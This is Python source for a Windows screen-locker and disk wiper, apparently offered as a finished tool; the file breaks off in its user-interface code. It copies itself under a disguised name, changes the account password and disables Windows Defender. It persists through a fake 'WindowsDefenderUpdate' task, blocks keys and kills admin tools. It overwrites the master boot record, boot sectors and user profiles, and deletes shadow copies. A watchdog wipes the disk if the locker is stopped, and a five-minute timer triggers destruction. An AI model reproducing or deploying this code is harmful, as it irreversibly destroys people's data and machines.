# language: Python 3.10+, file: qacklocker_v6.py, target: Windows 10/11 VM (isolated)
# v6 final: update_idletasks, frozen-safe _launch_line, schtasks via cmd /c,
# deadline от показа UI. Пароль 79383, оператор pu709, 5 мин -> снос.
import ctypes
import hashlib
import json
import os
import shutil
import string
import subprocess
import sys
import threading
import time
import webbrowser
from ctypes import wintypes

import psutil

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

try:
    import wmi
    HAS_WMI = True
except ImportError:
    HAS_WMI = False

# ================= НАСТРОЙКИ =================
OPERATOR = "pu709"
NEW_PASSWORD = "79383"
GLOBAL_DESTROY_SECONDS = 300.0

_SALT = b"QackLockerSalt_2026"
CORRECT_HASH = hashlib.sha256(_SALT + NEW_PASSWORD.encode()).hexdigest()

BLOCK_NAMES = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "format.com",
    "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe",
    "autoruns.exe", "autoruns64.exe", "psexec.exe", "psexec64.exe",
    "wmic.exe", "cscript.exe", "wscript.exe", "mshta.exe",
    "reg.exe", "sc.exe", "net.exe", "net1.exe", "rundll32.exe",
    "regsvr32.exe", "msiexec.exe", "control.exe", "mmc.exe",
    "tasklist.exe", "taskkill.exe", "schtasks.exe", "bcdedit.exe",
    "reagentc.exe", "vssadmin.exe", "wbadmin.exe", "diskshadow.exe",
    "chkdsk.exe", "bootrec.exe", "sfc.exe", "dism.exe",
    "bcdboot.exe", "certutil.exe", "bitsadmin.exe", "curl.exe",
    "py.exe", "pyw.exe",
}

BLOCK_PATHS = {
    r"c:\windows\system32\taskmgr.exe",
    r"c:\windows\system32\cmd.exe",
    r"c:\windows\system32\regedit.exe",
    r"c:\windows\system32\powershell.exe",
    r"c:\windows\system32\windowspowershell\v1.0\powershell.exe",
    r"c:\windows\system32\mmc.exe",
    r"c:\windows\system32\control.exe",
    r"c:\windows\system32\tasklist.exe",
    r"c:\windows\system32\taskkill.exe",
    r"c:\windows\system32\shutdown.exe",
    r"c:\windows\system32\wbem\wmiprvse.exe",
}

BLOCK_CMDLINE_TOKENS = (
    "taskmgr", "regedit", "processhacker", "msconfig",
    "powershell", "pwsh", "cmd.exe /c", "wmic",
)

_SELF_PID = os.getpid()
_STOP_FLAG = threading.Event()
_WNDPROC_REF = None
_GLOBAL_DEADLINE = 0.0

APPDATA = os.environ.get("APPDATA", ".")
BASE_DIR = os.path.join(APPDATA, "QackLocker")
ATTEMPTS_FILE = os.path.join(BASE_DIR, "attempts.dat")
DEFENDER_LOG = os.path.join(BASE_DIR, "defender_bypass.log")
STATE_FILE = os.path.join(BASE_DIR, "state.dat")
WATCHDOG_PID_FILE = os.path.join(BASE_DIR, "watchdog.pid")
REBOOT_TRIGGER = os.path.join(BASE_DIR, "reboot.trigger")

MASQ_DIR = os.path.join(APPDATA, "Microsoft")
MASQ_SCRIPT = os.path.join(MASQ_DIR, "explorer.py")

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C
FILE_FLAG_WRITE_THROUGH = 0x80000000
DRIVE_FIXED = 3

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE,
]
kernel32.WriteFile.argtypes = [
    wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.SetFilePointerEx.argtypes = [
    wintypes.HANDLE, ctypes.c_longlong,
    ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD,
]
kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.FlushFileBuffers.argtypes = [wintypes.HANDLE]
kernel32.FlushFileBuffers.restype = wintypes.BOOL
kernel32.GetDriveTypeW.argtypes = [wintypes.LPCWSTR]
kernel32.GetDriveTypeW.restype = wintypes.UINT
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
kernel32.GetExitCodeProcess.restype = wintypes.BOOL

user32.SetWindowsHookExW.restype = wintypes.HHOOK
user32.SetWindowsHookExW.argtypes = [
    ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD,
]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = [
    wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM,
]
user32.GetMessageW.argtypes = [
    ctypes.POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT,
]
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetWindowLongPtrW.restype = ctypes.c_ssize_t
user32.GetWindowLongPtrW.argtypes = [wintypes.HWND, ctypes.c_int]
user32.SetWindowLongPtrW.restype = ctypes.c_ssize_t
user32.SetWindowLongPtrW.argtypes = [wintypes.HWND, ctypes.c_int, ctypes.c_ssize_t]
user32.CallWindowProcW.restype = ctypes.c_ssize_t
user32.CallWindowProcW.argtypes = [ctypes.c_ssize_t, wintypes.HWND,
                                   wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]

WM_QUERYENDSESSION = 0x0011
WM_ENDSESSION = 0x0016
GWLP_WNDPROC = -4
STILL_ACTIVE = 259

# ================= UAC =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

# ================= HELPERS =================
def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)


def _reg_set_hklm(path, name, value, vtype=None):
    import winreg
    if vtype is None:
        vtype = winreg.REG_DWORD
    try:
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False


def reg_set_hkcu(path, name, value, vtype=1):
    import winreg
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False

# ================= SELF-MASQUERADE =================
def self_masquerade():
    try:
        os.makedirs(MASQ_DIR, exist_ok=True)
        src = os.path.abspath(__file__)
        dst = MASQ_SCRIPT
        if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
            shutil.copy2(src, dst)
        return dst
    except Exception:
        return None

# ================= SET PASSWORD (VM) =================
def set_local_password(username, password):
    rc, out = _run(["net", "user", username, password], timeout=15)
    return {"rc": rc, "ok": rc == 0}


def set_password_via_ps(username, password):
    ps = (f"$u=[ADSI]\"WinNT://$env:COMPUTERNAME/{username},user\"; "
          f"$u.SetPassword(\"{password}\"); $u.SetInfo()")
    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                    "-Command", ps], timeout=20)
    return {"rc": rc, "ok": rc == 0}


def change_account_password():
    username = os.environ.get("USERNAME", "")
    if not username:
        return {"ok": False}
    r1 = set_local_password(username, NEW_PASSWORD)
    if r1["ok"]:
        return {"ok": True, "method": "net user"}
    r2 = set_password_via_ps(username, NEW_PASSWORD)
    return {"ok": r2["ok"], "method": "ADSI"}

# ================= DEFENDER =================
def add_exclusions():
    ps_script = (
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\Microsoft\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'pythonw.exe' -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                  "-Command", ps_script], timeout=25)
    return {"set_rc": rc}


def check_tamper_protection():
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "(Get-MpComputerStatus).IsTamperProtected"], timeout=10)
    return {"rc": rc, "enabled": "True" in out}


def disable_via_powershell():
    ps_set = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                  "-Command", ps_set], timeout=20)
    return {"set_rc": rc}


def disable_via_registry():
    policy = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    rtp = policy + r"\Real-Time Protection"
    spynet = policy + r"\Spynet"
    written = {
        "DisableAntiSpyware": _reg_set_hklm(policy, "DisableAntiSpyware", 1),
        "DisableAntiVirus": _reg_set_hklm(policy, "DisableAntiVirus", 1),
        "ServiceStartup": _reg_set_hklm(policy, "ServiceStartup", 4),
        "DisableRealtimeMonitoring": _reg_set_hklm(rtp, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set_hklm(rtp, "DisableBehaviorMonitoring", 1),
        "DisableIOAVProtection": _reg_set_hklm(rtp, "DisableIOAVProtection", 1),
    }
    return {"written": written, "all_written": all(written.values())}


def stop_services():
    results = {}
    for svc in ("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService",
                "wscsvc", "MsMpSvc"):
        rc_stop, _ = _run(["sc", "stop", svc], timeout=10)
        rc_cfg, _ = _run(["sc", "config", svc, "start=", "disabled"], timeout=10)
        results[svc] = {"stop_rc": rc_stop, "config_rc": rc_cfg}
    return results


def bypass_defender():
    tp = check_tamper_protection()
    report = {
        "tamper_protection": tp,
        "powershell": disable_via_powershell(),
        "registry": disable_via_registry(),
        "services": stop_services(),
    }
    report["summary"] = {"tamper_protection_on": tp["enabled"]}
    return report


def run_defender_bypass_and_log():
    try:
        report = bypass_defender()
    except Exception as e:
        report = {"error": str(e)}
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(DEFENDER_LOG, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

# ================= STATE =================
def load_attempts():
    try:
        with open(ATTEMPTS_FILE, "r") as f:
            return int(f.read().strip())
    except Exception:
        return 0


def save_attempts(n):
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(ATTEMPTS_FILE, "w") as f:
            f.write(str(n))
    except Exception:
        pass


def mark_destroyed():
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(STATE_FILE, "w") as f:
            f.write("DESTROYED")
    except Exception:
        pass


def is_destroyed():
    try:
        with open(STATE_FILE, "r") as f:
            return f.read().strip() == "DESTROYED"
    except Exception:
        return False

# ================= DISK =================
def _open_drive0():
    h = kernel32.CreateFileW(
        r"\\.\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
    )
    if not h or h == INVALID_HANDLE_VALUE:
        return None
    return h


def _write_at(h, offset, data):
    kernel32.SetFilePointerEx(h, ctypes.c_longlong(offset), None, 0)
    written = wintypes.DWORD(0)
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    ok = kernel32.WriteFile(h, buf, len(data), ctypes.byref(written), None)
    kernel32.FlushFileBuffers(h)
    return bool(ok)


def wipe_mbr():
    h = _open_drive0()
    if not h:
        return False
    try:
        junk = bytearray(os.urandom(512))
        junk[510] = 0
        junk[511] = 0
        if not _write_at(h, 0, bytes(junk)):
            return False
        _write_at(h, 512, b"\xFF" * 4096)
        length = ctypes.c_ulonglong(0)
        ret = wintypes.DWORD(0)
        kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                                 None, 0, ctypes.byref(length), 8,
                                 ctypes.byref(ret), None)
        if length.value > 1024:
            _write_at(h, length.value - 512, b"\xFF" * 512)
        return True
    finally:
        kernel32.CloseHandle(h)


def enumerate_fixed_volumes():
    vols = []
    for L in string.ascii_uppercase:
        root = f"{L}:\\"
        try:
            if kernel32.GetDriveTypeW(root) == DRIVE_FIXED and os.path.exists(root):
                vols.append(f"{L}:")
        except Exception:
            continue
    return vols


def wipe_vbr_all():
    for drive in enumerate_fixed_volumes():
        try:
            h = kernel32.CreateFileW(
                f"\\\\.\\{drive}",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
            )
            if not h or h == INVALID_HANDLE_VALUE:
                continue
            try:
                _write_at(h, 0, os.urandom(512))
            finally:
                kernel32.CloseHandle(h)
        except Exception:
            pass


def nuke_all_volumes():
    for drive in enumerate_fixed_volumes():
        try:
            h = kernel32.CreateFileW(
                f"\\\\.\\{drive}",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
            )
            if not h or h == INVALID_HANDLE_VALUE:
                continue
            try:
                _write_at(h, 0, os.urandom(512))
                _write_at(h, 512, b"\xFF" * 4096)
                length = ctypes.c_ulonglong(0)
                ret = wintypes.DWORD(0)
                kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                                         None, 0, ctypes.byref(length), 8,
                                         ctypes.byref(ret), None)
                if length.value > 1024:
                    _write_at(h, length.value - 512, b"\xFF" * 512)
            finally:
                kernel32.CloseHandle(h)
        except Exception:
            pass


def destroy_boot_and_recovery():
    for c in (
        ["vssadmin", "delete", "shadows", "/all", "/quiet"],
        ["wbadmin", "delete", "catalog", "-quiet"],
        ["reagentc", "/disable"],
        ["bcdedit", "/set", "{bootmgr}", "path", r"\NONEXISTENT"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
    ):
        try:
            subprocess.run(c, capture_output=True,
                           creationflags=CREATE_NO_WINDOW, timeout=20)
        except Exception:
            pass

# ================= USERS =================
def list_user_profiles():
    base = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
    out = []
    if not os.path.isdir(base):
        return out
    skip = {"public", "default", "default user", "all users"}
    try:
        for name in os.listdir(base):
            p = os.path.join(base, name)
            if os.path.isdir(p) and name.lower() not in skip:
                out.append(p)
    except Exception:
        pass
    return out


def shred_dir(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for f in files:
            fp = os.path.join(root, f)
            try:
                size = os.path.getsize(fp)
                if 0 < size < 64 * 1024 * 1024:
                    with open(fp, "r+b", buffering=0) as fh:
                        left = size
                        chunk = os.urandom(65536)
                        while left > 0:
                            n = min(left, len(chunk))
                            fh.write(chunk[:n])
                            left -= n
                        fh.flush()
                        os.fsync(fh.fileno())
            except Exception:
                pass
            try:
                os.remove(fp)
            except Exception:
                pass
        for d in dirs:
            try:
                os.rmdir(os.path.join(root, d))
            except Exception:
                pass
    try:
        os.rmdir(path)
    except Exception:
        pass


def nuke_users():
    for prof in list_user_profiles():
        try:
            shred_dir(prof)
        except Exception:
            pass
    for prof in list_user_profiles():
        try:
            subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", prof],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=60)
        except Exception:
            pass

# ================= FULL DESTROY =================
def full_destroy(force=False):
    if not force and is_destroyed():
        return
    try:
        wipe_mbr()
    except Exception:
        pass
    try:
        wipe_vbr_all()
    except Exception:
        pass
    try:
        destroy_boot_and_recovery()
    except Exception:
        pass
    try:
        nuke_all_volumes()
    except Exception:
        pass
    try:
        nuke_users()
    except Exception:
        pass
    mark_destroyed()
    try:
        subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
                         creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

# ================= AUTOSTART =================
def _launch_line():
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}"'
    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pyw):
        pyw = sys.executable
    return f'"{pyw}" "{script}"'


def _schtasks_create(line):
    inner = f'schtasks /create /tn WindowsDefenderUpdate /tr "{line}" /sc onlogon /rl highest /f'
    try:
        subprocess.run(["cmd", "/c", inner], capture_output=True,
                       creationflags=CREATE_NO_WINDOW, timeout=15)
    except Exception:
        pass


def _schtasks_delete():
    try:
        subprocess.run(["cmd", "/c", "schtasks /delete /tn WindowsDefenderUpdate /f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass


def install_autostart():
    line = _launch_line()
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "explorer", 0, winreg.REG_SZ, line)
    except Exception:
        pass
    _schtasks_create(line)


def remove_autostart():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "explorer")
    except Exception:
        pass
    _schtasks_delete()


def apply_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    reg_set_hkcu(sys_path, "DisableTaskMgr", 1)
    reg_set_hkcu(sys_path, "DisableLockWorkstation", 1)
    reg_set_hkcu(sys_path, "DisableChangePassword", 1)
    exp = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    reg_set_hkcu(exp, "NoWinKeys", 1)
    reg_set_hkcu(exp, "NoLogoff", 1)
    reg_set_hkcu(exp, "NoClose", 1)
    reg_set_hkcu(exp, "NoRun", 1)


def clear_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    reg_set_hkcu(sys_path, "DisableTaskMgr", 0)
    reg_set_hkcu(sys_path, "DisableLockWorkstation", 0)
    reg_set_hkcu(sys_path, "DisableChangePassword", 0)
    exp = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    reg_set_hkcu(exp, "NoWinKeys", 0)
    reg_set_hkcu(exp, "NoLogoff", 0)
    reg_set_hkcu(exp, "NoClose", 0)
    reg_set_hkcu(exp, "NoRun", 0)

# ================= KEYBOARD HOOK =================
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
VK_0, VK_9 = 0x30, 0x39
VK_ENTER, VK_BACK, VK_TAB = 0x0D, 0x08, 0x09
VK_MENU = 0x12
VK_ESCAPE = 0x1B


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


_kb_proc_ref = None
_kb_hook = None


def _kb_proc(nCode, wParam, lParam):
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        if vk == VK_TAB and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk in (0x5B, 0x5C):
            return 1
        if vk == VK_ESCAPE:
            if user32.GetAsyncKeyState(VK_MENU) & 0x8000:
                return 1
            if user32.GetAsyncKeyState(0x11) & 0x8000:
                return 1
        allowed = (VK_0 <= vk <= VK_9) or vk in (VK_ENTER, VK_BACK, VK_TAB)
        if not allowed:
            return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)


def install_keyboard_hook():
    global _kb_proc_ref, _kb_hook
    if _kb_hook:
        return
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                  wintypes.WPARAM, wintypes.LPARAM)
    _kb_proc_ref = HOOKPROC(_kb_proc)
    _kb_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_proc_ref,
                                        kernel32.GetModuleHandleW(None), 0)


def uninstall_keyboard_hook():
    global _kb_hook
    if _kb_hook:
        try:
            user32.UnhookWindowsHookEx(_kb_hook)
        except Exception:
            pass
        _kb_hook = None

# ================= SHUTDOWN WATCHER =================
def install_shutdown_watcher(win):
    global _WNDPROC_REF
    hwnd = win.winfo_id()
    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND, wintypes.UINT,
                                 wintypes.WPARAM, wintypes.LPARAM)
    old = user32.GetWindowLongPtrW(hwnd, GWLP_WNDPROC)

    def _proc(h, msg, wp, lp):
        if msg in (WM_QUERYENDSESSION, WM_ENDSESSION):
            try:
                with open(REBOOT_TRIGGER, "w") as f:
                    f.write("REBOOT")
            except Exception:
                pass
            return 1
        return user32.CallWindowProcW(old, h, msg, wp, lp)

    _WNDPROC_REF = WNDPROC(_proc)
    user32.SetWindowLongPtrW(hwnd, GWLP_WNDPROC,
                             ctypes.cast(_WNDPROC_REF, ctypes.c_void_p).value)
    return _WNDPROC_REF

# ================= WATCHDOG =================
def _parent_alive(pid):
    try:
        p = kernel32.OpenProcess(0x1000, False, pid)
        if not p:
            return False
        ec = wintypes.DWORD(0)
        kernel32.GetExitCodeProcess(p, ctypes.byref(ec))
        kernel32.CloseHandle(p)
        return ec.value == STILL_ACTIVE
    except Exception:
        return False


def _watchdog_nuke():
    try:
        h = kernel32.CreateFileW(r"\\.\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                 OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None)
        if h and h != INVALID_HANDLE_VALUE:
            junk = bytearray(os.urandom(512))
            junk[510] = 0
            junk[511] = 0
            _write_at(h, 0, bytes(junk))
            _write_at(h, 512, b"\xFF" * 4096)
            ln = ctypes.c_ulonglong(0)
            ret = wintypes.DWORD(0)
            kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO, None, 0,
                                     ctypes.byref(ln), 8, ctypes.byref(ret), None)
            if ln.value > 1024:
                _write_at(h, ln.value - 512, b"\xFF" * 512)
            kernel32.CloseHandle(h)
    except Exception:
        pass
    try:
        nuke_all_volumes()
    except Exception:
        pass
    try:
        nuke_users()
    except Exception:
        pass
    try:
        destroy_boot_and_recovery()
    except Exception:
        pass
    try:
        with open(STATE_FILE, "w") as f:
            f.write("DESTROYED")
    except Exception:
        pass
    try:
        subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
                         creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass


def watchdog_main(parent_pid):
    while True:
        if os.path.exists(REBOOT_TRIGGER):
            _watchdog_nuke()
            break
        if not _parent_alive(parent_pid):
            _watchdog_nuke()
            break
        time.sleep(0.5)


def spawn_watchdog():
    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
    args = [sys.executable, script, "--watchdog", str(_SELF_PID)]
    try:
        proc = subprocess.Popen(args, creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
                                close_fds=True)
        with open(WATCHDOG_PID_FILE, "w") as f:
            f.write(str(proc.pid))
        return proc
    except Exception:
        return None


def kill_watchdog():
    try:
        with open(WATCHDOG_PID_FILE, "r") as f:
            pid = int(f.read().strip())
        psutil.Process(pid).kill()
    except Exception:
        pass
    try:
        os.remove(WATCHDOG_PID_FILE)
    except Exception:
        pass
    try:
        os.remove(REBOOT_TRIGGER)
    except Exception:
        pass

# ================= PROCESS KILL =================
def _proc_blocked(proc):
    try:
        info = proc.info
        cmd = " ".join(info.get("cmdline") or []).lower()
        if "--watchdog" in cmd:
            return False
        exe = (info.get("exe") or "").lower()
        if "appdata" in exe and "explorer.py" in exe:
            return False
        name = (info.get("name") or "").lower()
        if name in BLOCK_NAMES:
            return True
        if exe in BLOCK_PATHS:
            return True
        for tok in BLOCK_CMDLINE_TOKENS:
            if tok in cmd:
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
    return False


def kill_blocked():
    for proc in psutil.process_iter(["name", "exe", "cmdline", "ppid", "pid"]):
        try:
            if proc.info.get("pid") == _SELF_PID:
                continue
            if proc.info.get("ppid") == _SELF_PID:
                continue
            if _proc_blocked(proc):
                proc.kill()
        except Exception:
            pass


def blocking_loop():
    while not _STOP_FLAG.is_set():
        kill_blocked()
        time.sleep(0.02)


def wmi_kill_loop():
    if not HAS_WMI:
        return
    try:
        c = wmi.WMI()
        watcher = c.Win32_Process.watch_for("creation")
    except Exception:
        return
    while not _STOP_FLAG.is_set():
        try:
            p = watcher(timeout_ms=200)
        except Exception:
            time.sleep(0.3)
            continue
        try:
            name = (p.Name or "").lower()
            cmd = (p.CommandLine or "").lower()
            if "--watchdog" in cmd:
                continue
            if name in BLOCK_NAMES or any(t in cmd for t in BLOCK_CMDLINE_TOKENS):
                subprocess.run(["taskkill", "/f", "/pid", str(p.ProcessId)],
                               capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
        except Exception:
            pass


def _system_explorer_pids():
    pids = []
    for p in psutil.process_iter(["name", "exe", "pid"]):
        try:
            if (p.info.get("name") or "").lower() != "explorer.exe":
                continue
            exe = (p.info.get("exe") or "").lower()
            if "appdata" in exe:
                continue
            pids.append(p.info["pid"])
        except Exception:
            pass
    return pids


def desktop_watchdog():
    while not _STOP_FLAG.is_set():
        for pid in _system_explorer_pids():
            try:
                psutil.Process(pid).kill()
            except Exception:
                pass
        for name in ("ctfmon.exe",):
            try:
                subprocess.run(["taskkill", "/f", "/im", name],
                               capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
            except Exception:
                pass
        time.sleep(2.0)

# ================= SOUND =================
_screams_started = False
_scream_path = None


def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None


def init_scream():
    global _scream_path
    if not HAS_PYGAME:
        return
    path = resource_path("scream.mp3")
    if not path:
        return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        _scream_path = path
    except Exception:
        _scream_path = None


def schedule_screams(win):
    global _screams_started
    if _screams_started or not HAS_PYGAME or _scream_path is None:
        return
    _screams_started = True

    def scream_once():
        try:
            pygame.mixer.music.stop()
            pygame.mixer.music.play()
        except Exception:
            pass
        win.after(10000, scream_once)

    scream_once()

# ================= UI =================
def run_ui():
    import tkinter as tk
    from PIL import Image, ImageTk

    global _GLOBAL_DEADLINE
    _GLOBAL_DEADLINE = time.time() + GLOBAL_DESTROY_SECONDS
    deadline = _GLOBAL_DEADLINE

    win = tk.Tk()
    win.title(f"System Locker — {OPERATOR}")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    win.update_idletasks()
    try:
        install_shutdown_watcher(win)
    except Exception:
        pass

    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            img = Image.open(eye_path).resize((420, 200))
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(win, image=photo, bg="#000000", bd=0)
            lbl.image = photo
            lbl.place(relx=0.5, rely=0.45, anchor="center")
        except Exception:
            tk.Label(win, text="[Eye Error]", fg="red", bg="black").place(
                relx=0.5, rely=0.45, anchor="center")
    else:
        tk.Label(win, text="[Eye Missing]", fg="red", bg="black").place(
            relx=0.5, rely=0.45, anchor="center")

    boot1 = "Booting System\n\nMemory section at adres 0x420 IS LOCKED!!"
    boot2 = f"  WIN LOCKED ACTIVATE\n  CRYPTER starting...\n  operator: {OPERATOR}"

    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
                     font=("Consolas", 15), anchor="w", justify="left")
    label.pack(anchor="w")
